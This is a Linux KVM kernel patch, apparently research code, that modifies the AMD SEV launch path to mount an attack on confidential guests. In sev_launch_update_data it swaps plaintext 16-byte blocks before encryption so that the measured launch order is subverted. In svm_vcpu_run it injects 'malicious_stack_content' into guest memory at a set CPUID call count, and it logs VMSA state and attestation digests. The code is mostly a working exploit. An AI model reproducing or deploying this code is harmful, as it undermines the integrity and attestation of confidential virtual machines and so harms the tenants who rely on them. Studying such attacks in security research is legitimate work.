@@ -55,6 +55,8 @@
 #include <asm/virtext.h>
 #include "trace.h"
 
+#include <linux/launch-attack.h>
+
 #define __ex(x) __kvm_handle_fault_on_reboot(x)
 
 MODULE_AUTHOR("Qumranet");
@@ -1178,6 +1180,7 @@ static __init void sev_hardware_setup(void)
 		goto no_sev;
 
 	pr_info("SEV supported: %u ASIDs\n", max_sev_asid - min_sev_asid + 1);
+	printk("Platform status: API MAJOR 0x%02x API MINOR 0x%02x BUILD 0x%02x\n",status->api_major,status->api_minor,status->build);
 
 	/*
 	 * Check for SEV-ES support.
@@ -6283,6 +6286,27 @@ static void svm_vcpu_run(struct kvm_vcpu *vcpu)
 
 	local_irq_enable();
 
+
+
+	if( launch_attack_config.current_cpuid_call_count > launch_attack_config.target_cpuid_call_count ) { //sev-es; 17 also works?! than 16 must be before the required call
+		uint64_t hva;
+		//ghcb page use in ovmf code
+		hva = gfn_to_hva(vcpu->kvm, gpa_to_gfn(0x809000));
+
+
+		if (kvm_is_error_hva(hva)) {
+			printk(KERN_CRIT
+				"in %s line %d translation to hva failed\n",
+				__FILE__, __LINE__);
+		} else {			
+			uint8_t *base = (uint8_t*)hva;
+			wbinvd_on_all_cpus();
+			memcpy(base,launch_attack_config.malicious_stack_content,launch_attack_config.malicious_stack_content_len);
+			wbinvd_on_all_cpus();
+		}
+	}
+
+
 	if (sev_es_guest(svm->vcpu.kvm)) {
 		asm volatile (
 			"push %%" _ASM_BP "; \n\t"
@@ -7145,7 +7169,7 @@ static int sev_launch_start(struct kvm *kvm, struct kvm_sev_cmd *argp)
 
 	start->handle = params.handle;
 	start->policy = params.policy;
-
+	printk("params policy is 0x%x\n",start->policy);
 	/* create memory encryption context */
 	ret = __sev_issue_cmd(argp->sev_fd, SEV_CMD_LAUNCH_START, start, error);
 	if (ret)
@@ -7197,45 +7221,19 @@ static unsigned long get_num_contig_pages(unsigned long idx,
 	return pages;
 }
 
-static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
-{
-	unsigned long vaddr, vaddr_end, next_vaddr, npages, pages, size, i;
-	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
-	struct kvm_sev_launch_update_data params;
+static int load_virt_cont(uint64_t vaddr, uint64_t vaddr_end,struct page**inpages,uint64_t npages,struct kvm *kvm, struct kvm_sev_cmd *argp,uint64_t abs_vaddr_start) {
+	uint64_t pages,i,next_vaddr,size;
 	struct sev_data_launch_update_data *data;
-	struct page **inpages;
+	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
 	int ret;
-
-	if (!sev_guest(kvm))
-		return -ENOTTY;
-
-	if (copy_from_user(&params, (void __user *)(uintptr_t)argp->data, sizeof(params)))
-		return -EFAULT;
-
+	size = vaddr_end - vaddr;
 	data = kzalloc(sizeof(*data), GFP_KERNEL_ACCOUNT);
-	if (!data)
+	if (!data) {
 		return -ENOMEM;
-
-	vaddr = params.uaddr;
-	size = params.len;
-	vaddr_end = vaddr + size;
-
-	/* Lock the user memory. */
-	inpages = sev_pin_memory(kvm, vaddr, size, &npages, 1);
-	if (!inpages) {
-		ret = -ENOMEM;
-		goto e_free;
 	}
-
-	/*
-	 * The LAUNCH_UPDATE command will perform in-place encryption of the
-	 * memory content (i.e it will write the same memory region with C=1).
-	 * It's possible that the cache may contain the data with C=0, i.e.,
-	 * unencrypted so invalidate it first.
-	 */
-	sev_clflush_pages(inpages, npages);
-
-	for (i = 0; vaddr < vaddr_end; vaddr = next_vaddr, i += pages) {
+	//i maps vaddr to paddr for inpages array, count number of pages (in vaddr) sicne
+	//start to get the index for the current vaddr
+	for (i = (vaddr-abs_vaddr_start)/PAGE_SIZE; vaddr < vaddr_end; vaddr = next_vaddr, i += pages) {
 		int offset, len;
 
 		/*
@@ -7252,14 +7250,166 @@ static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
 		data->handle = sev->handle;
 		data->len = len;
 		data->address = __sme_page_pa(inpages[i]) + offset;
+		printk("calling sev_issue_cmd paddr %llx len %x for vaddr %llx\n",data->address,data->len,vaddr);
 		ret = sev_issue_cmd(kvm, SEV_CMD_LAUNCH_UPDATE_DATA, data, &argp->error);
-		if (ret)
-			goto e_unpin;
+		if (ret) {
+			return 1;
+		}
 
 		size -= len;
 		next_vaddr = vaddr + len;
 	}
+	return 0;
+}
 
+static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
+{
+	unsigned long vaddr, vaddr_end, npages, size, i;
+	//struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+	struct kvm_sev_launch_update_data params;
+	struct sev_data_launch_update_data *data;
+	struct page **inpages;
+	int ret;
+	uint64_t sizeIn16BChuncks;
+	uint64_t * ordered_16byte_chunks = NULL;
+
+	ret = 0;
+	if (!sev_guest(kvm))
+		return -ENOTTY;
+
+	if (copy_from_user(&params, (void __user *)(uintptr_t)argp->data, sizeof(params)))
+		return -EFAULT;
+
+	data = kzalloc(sizeof(*data), GFP_KERNEL_ACCOUNT);
+	if (!data)
+		return -ENOMEM;
+
+	vaddr = params.uaddr;
+	size = params.len;
+	vaddr_end = vaddr + size;
+	printk("sev_launch_update_data: vaddr=%lx size=%lx vaddr_end=%lx\n",vaddr,size,vaddr_end);
+	//generate array mapping 16 blocks indices to offsets, initially 1:1, pertubed in the next step
+	if( size % 16 != 0) {
+		printk("sev_lauch_update_data called with size %lx which is not a multiple of 16, aborting",size);
+		ret = 1;
+		goto e_free;
+	}
+	if( (vaddr & (PAGE_SIZE -1)) != 0 ) {
+		printk("buffer is not page aligned");
+		ret = 1;
+		goto e_free;
+	}
+
+	printk("sev_launch_update_data: vaddr checks passed");
+	sizeIn16BChuncks = size/16;
+	ordered_16byte_chunks = vmalloc(sizeIn16BChuncks * sizeof(uint64_t)); 
+	if( ordered_16byte_chunks == NULL ) {
+		printk("sev_launch_update_data: failed to alloc ordered_16byte_chunks array\n");
+	}
+	for(i = 0; i < sizeIn16BChuncks; i++) {
+		ordered_16byte_chunks[i] = (i*16);
+	}
+	printk("sev_launch_update_data: ordered_16_byte_chunks array initialized\n");
+	//perform swapping and update array so that reading it from left to right still gives us the correct order
+	if( launch_attack_config.active) {
+		uint64_t target_offset = launch_attack_config.target_block;
+		uint64_t source_offset;
+		uint8_t buffer[16];
+		uint8_t buffer2[16];
+		int err_code;
+		for( i = 0; i < launch_attack_config.source_blocks_len; i++,target_offset+=16) {
+			source_offset = launch_attack_config.source_blocks[i];
+			printk("sev_launch_update_data: swapping target=%llx with source=%llx\n", vaddr+target_offset, vaddr+source_offset);
+			//copy target_offset to buffer
+			if( (err_code = copy_from_user(buffer,(void*)(vaddr+target_offset),16) )) {
+				printk("copy target to buffer failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy source_offset to buffer2
+			if( (err_code = copy_from_user(buffer2,(void*)(vaddr+source_offset),16) ) ) {
+				printk("copy source to buffer2 failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy buffer to buffer2 to source offset
+			if( (err_code = copy_to_user((void*)(vaddr+target_offset),buffer2,16))){
+				printk("copy buffer 2 to target failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy buffer to source_offset
+			if( (err_code = copy_to_user((void*)(vaddr+source_offset),buffer,16))) {
+				printk("copy buffer to source failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//adjust entries in ordered_16byte_chunks array
+			ordered_16byte_chunks[target_offset/16] = source_offset;
+			ordered_16byte_chunks[source_offset/16] = target_offset;
+		}
+	}
+	printk("sev_launch_update_data: swapped plaintext data");
+	//lock 
+
+	/* Lock the user memory. */
+	inpages = sev_pin_memory(kvm, vaddr, size, &npages, 1);
+	if (!inpages) {
+		ret = -ENOMEM;
+		goto e_free;
+	}
+
+	/*
+	 * The LAUNCH_UPDATE command will perform in-place encryption of the
+	 * memory content (i.e it will write the same memory region with C=1).
+	 * It's possible that the cache may contain the data with C=0, i.e.,
+	 * unencrypted so invalidate it first.
+	 */
+	sev_clflush_pages(inpages, npages);
+
+	for( i = 0; i < sizeIn16BChuncks; ) {
+		uint64_t cont_offset_start, cont_offset_end;
+		uint64_t j;
+		int r;
+		cont_offset_start=ordered_16byte_chunks[i];
+		cont_offset_end = cont_offset_start+16;
+		//increase cont_vaddr_end until we encounter an uncontinous area
+		for( j = i+1 ; j < sizeIn16BChuncks;j++,i++ ) {
+			if(ordered_16byte_chunks[j] != cont_offset_end) {
+				i++;
+				break;
+			}
+			cont_offset_end += 16;
+		}
+		//previous conditions break on last loop; refactor to something better
+		if(i+1 >= sizeIn16BChuncks) {
+			i++;
+		}
+		//use "old" code to load continous virt memory area as fast as possible (check cont paddrs)
+		printk("sev_launch_update_data: calling load_virt_cont for %llx to %llx\n",vaddr+cont_offset_start,vaddr+cont_offset_end);
+		//+vaddr to go rom offset to total vaddr
+		r = load_virt_cont(vaddr+cont_offset_start,vaddr+cont_offset_end,inpages,npages,kvm,argp,vaddr);
+		if( r != 0 ) {
+			ret = r;
+			goto e_unpin;
+		}
+		// uint64_t total_vaddr_offset = ordered_16byte_chunks[i];
+		// uint64_t page_index = total_vaddr_offset / PAGE_SIZE;
+
+		// data->handle = sev->handle;
+		// data->len = 16;
+		// //inpages maps to the paddr
+		// data->address = __sme_page_pa(inpages[page_index]) + (total_vaddr_offset%PAGE_SIZE);
+		// if( total_vaddr_offset%PAGE_SIZE == 0) {
+		// 	printk("sev_launch_update_data: total_vaddr_offset=%llx paddr=%llx\n",total_vaddr_offset,data->address);
+		// }
+		// ret = sev_issue_cmd(kvm, SEV_CMD_LAUNCH_UPDATE_DATA, data, &argp->error);
+		// if (ret) {
+		// 	goto e_unpin;
+		// }
+	}
+	printk("sev_launch_update_data: finished launch loop\n");
+	
 e_unpin:
 	/* content of memory is updated, mark pages dirty */
 	for (i = 0; i < npages; i++) {
@@ -7270,6 +7420,9 @@ e_unpin:
 	sev_unpin_memory(kvm, inpages, npages);
 e_free:
 	kfree(data);
+	if(ordered_16byte_chunks != NULL ) {
+		vfree(ordered_16byte_chunks);
+	}
 	return ret;
 }
 
@@ -7278,6 +7431,7 @@ static int sev_launch_update_vmsa(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
 	struct sev_data_launch_update_vmsa *vmsa;
 	int i, ret;
+	int byteOffset;
 
 	if (!sev_es_guest(kvm))
 		return -ENOTTY;
@@ -7292,6 +7446,17 @@ static int sev_launch_update_vmsa(struct kvm *kvm, struct kvm_sev_cmd *argp)
 
 		/* Set XCR0 before encrypting */
 		save->xcr0 = svm->vcpu.arch.xcr0;
+
+		printk("vmsa data (lenght 0x%lx)\n",PAGE_SIZE);
+		for( byteOffset = 0; byteOffset < PAGE_SIZE; byteOffset++ ) {
+			/*
+			if( (byteOffset != 0) && (byteOffset % 128) == 0) {
+				printk("\n");
+			}
+			*/
+			printk(KERN_CONT "%02x",((uint8_t*)save)[byteOffset]);
+		}
+		printk("\n");
 
 		/*
 		 * The LAUNCH_UPDATE_VMSA command will perform in-place
@@ -7317,6 +7482,65 @@ e_free:
 	return ret;
 }
 
+static void sev_attestation(struct kvm *kvm, uint8_t * mnonce) {
+	struct sev_data_attestation * data;
+	struct sev_data_attestation_report *result;
+	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+	int ret,i;
+	unsigned int api_error;
+	printk("in sev_attestation\n");
+	data = kzalloc(sizeof(struct sev_data_attestation),GFP_KERNEL_ACCOUNT);
+	if(!data) {
+		printk("failed to alloc data \n");
+		return;
+	}
+	result = kzalloc(sizeof(struct sev_data_attestation_report), GFP_KERNEL);
+	if(!result) {
+		kfree(data);
+		printk("failed to alloc result\n");
+		return;
+	}
+
+
+	data->handle = sev->handle;
+	data->paddr =  __psp_pa(result);
+	memcpy(data->mnonce, mnonce,16);
+	printk("callling SEV_CMD_ATTESTATION with mnonce:\n");
+	for( i = 0; i < 16; i++ ) {
+		printk(KERN_CONT "%02x", data->mnonce[i]);
+	}
+	printk("\n");
+	data->length = sizeof(struct sev_data_attestation_report);
+
+	ret = sev_issue_cmd(kvm, SEV_CMD_ATTESTATION, data, &api_error);
+	if(ret) {
+		printk("sev_issue_cmd returned %d\n",ret);
+		goto free;
+	}
+
+	printk("api error is %u\n",api_error);
+
+	printk("attestation mnonce\n");
+	for( i = 0; i < 16; i++ ) {
+		printk(KERN_CONT "%02x", result->mnonce[i]);
+	}
+	printk("\n");
+
+	printk("attestation digest\n");
+	for( i = 0; i < 32; i++ ) {
+		printk(KERN_CONT "%02x", result->launch_digest[i]);
+	}
+	printk("\n");
+
+
+	free:
+	kfree(data);
+	kfree(result);
+
+
+}
+
+
 static int sev_launch_measure(struct kvm *kvm, struct kvm_sev_cmd *argp)
 {
 	void __user *measure = (void __user *)(uintptr_t)argp->data;
@@ -7327,6 +7551,7 @@ static int sev_launch_measure(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	void *blob = NULL;
 	int ret;
 
+	printk("in sev_launch_measure\n");
 	if (!sev_guest(kvm))
 		return -ENOTTY;
 
@@ -7361,6 +7586,14 @@ cmd:
 	data->handle = sev->handle;
 	ret = sev_issue_cmd(kvm, SEV_CMD_LAUNCH_MEASURE, data, &argp->error);
 
+	if( blob ) {
+		//mnonce starts at blob+32
+		sev_attestation(kvm,((uint8_t*)blob)+32);
+	} else {
+		printk("sev_launch_measure called without result param, not calling attestation\n");
+	}
+	
+
 	/*
 	 * If we query the session length, FW responded with expected data.
 	 */
@@ -7375,6 +7608,7 @@ cmd:
 			ret = -EFAULT;
 	}
 
+
 done:
 	params.len = data->len;
 	if (copy_to_user(measure, &params, sizeof(params)))
@@ -7385,6 +7619,8 @@ e_free:
 	kfree(data);
 	return ret;
 }
+
+
 
 static int sev_launch_finish(struct kvm *kvm, struct kvm_sev_cmd *argp)
 {
